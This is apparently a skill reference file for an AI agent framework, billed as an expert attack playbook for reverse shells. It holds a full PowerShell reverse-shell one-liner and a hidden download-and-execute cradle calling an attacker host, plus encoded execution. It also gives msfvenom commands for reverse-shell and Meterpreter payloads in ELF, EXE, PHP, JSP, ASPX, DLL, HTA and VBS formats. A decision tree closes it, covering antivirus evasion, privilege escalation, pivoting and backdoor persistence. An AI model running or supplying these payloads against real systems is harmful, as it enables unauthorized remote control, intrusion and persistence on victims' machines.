# SKILL: Reverse Shell Techniques — Expert Attack Playbook: detailed technique reference

<!-- zhiyugo:resource:start -->
> ZhiyuGo reference material only. Inspect it explicitly through catalog resource tooling when the main Skill names this file; examples do not grant tools, authorization, or evidence.
<!-- zhiyugo:resource:end -->

<!-- zhiyugo:toc:start -->
## Contents

- [6. POWERSHELL REVERSE SHELLS](#6-powershell-reverse-shells)
- [7. MSFVENOM PAYLOADS](#7-msfvenom-payloads)
- [8. DECISION TREE](#8-decision-tree)
<!-- zhiyugo:toc:end -->

## 6. POWERSHELL REVERSE SHELLS

```powershell
# One-liner TCP reverse shell
$c=New-Object Net.Sockets.TCPClient('ATTACKER',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([Text.Encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()

# Download cradle + execute
powershell -nop -w hidden -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/shell.ps1')"

# Base64 encoded execution
$cmd = '...reverse shell code...'
$bytes = [Text.Encoding]::Unicode.GetBytes($cmd)
$encoded = [Convert]::ToBase64String($bytes)
powershell -ep bypass -enc $encoded
```

---

## 7. MSFVENOM PAYLOADS

```bash
# Linux reverse shell (ELF)
msfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f elf -o shell

# Windows reverse shell (EXE)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f exe -o shell.exe

# Meterpreter (staged)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER LPORT=4444 -f exe -o meter.exe

# Web payloads
msfvenom -p php/reverse_php LHOST=ATTACKER LPORT=4444 -f raw > shell.php
msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f raw > shell.jsp
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f aspx -o shell.aspx

# DLL / HTA / VBS
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f dll -o evil.dll
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f hta-psh -o evil.hta
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f vbs -o evil.vbs
```

---

## 8. DECISION TREE

```
Need remote shell on target
│
├── Can execute commands already (RCE)?
│   ├── Linux target?
│   │   ├── bash/python/perl available? → one-liner reverse shell (CHEATSHEET.md)
│   │   ├── Need encryption? → OpenSSL or socat SSL shell (§2)
│   │   └── Outbound blocked? → bind shell or tunnel (see tunneling-and-pivoting)
│   │
│   ├── Windows target?
│   │   ├── PowerShell available? → PS reverse shell (§6)
│   │   ├── Need binary? → msfvenom payload (§7)
│   │   └── AV blocking? → load windows-av-evasion skill
│   │
│   └── Web server (upload possible)?
│       ├── PHP? → PHP web shell (§3) → upgrade to reverse shell
│       ├── ASP.NET? → ASPX shell (§3)
│       └── Java/Tomcat? → JSP shell (§3)
│
├── Got a dumb shell?
│   ├── Python available? → PTY upgrade (§4)
│   ├── script available? → script /dev/null -c bash (§4)
│   ├── socat on target? → socat full PTY (§4)
│   └── None? → rlwrap on attacker side for readline
│
├── Need to transfer tools?
│   ├── Linux: wget/curl/nc/base64 (§5)
│   ├── Windows: certutil/PowerShell/bitsadmin/SMB (§5)
│   └── No outbound? → base64 copy-paste (§5)
│
└── Shell established — next steps?
    ├── Privilege escalation → load linux/windows-privilege-escalation
    ├── Pivot to internal network → load tunneling-and-pivoting
    └── Persistence → implant backdoor
```
